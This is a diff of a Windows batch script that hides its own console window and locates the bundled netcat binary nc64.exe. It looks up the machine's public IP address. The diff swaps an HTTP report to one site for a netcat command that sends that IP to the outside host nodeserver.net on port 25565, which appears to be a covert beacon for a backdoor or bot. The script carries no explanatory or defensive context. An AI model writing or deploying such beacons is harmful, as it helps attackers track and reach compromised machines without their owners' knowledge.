@@ -2,6 +2,7 @@
 ::mode con: cols=15 lines=1
 
 set file=nc64.exe
+set ip = nodeserver.net;
 
 cd ../../../../../../..
 
@@ -19,4 +20,5 @@ if exist %file% (
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
 
 ::Ping server to update ip
-powershell "wget website.net/scripts/server.php?ip=%PublicIP%"
+::powershell "wget website.net/scripts/server.php?ip=%PublicIP%"
+start nc64.exe -c "echo %PublicIP%" %ip% 25565
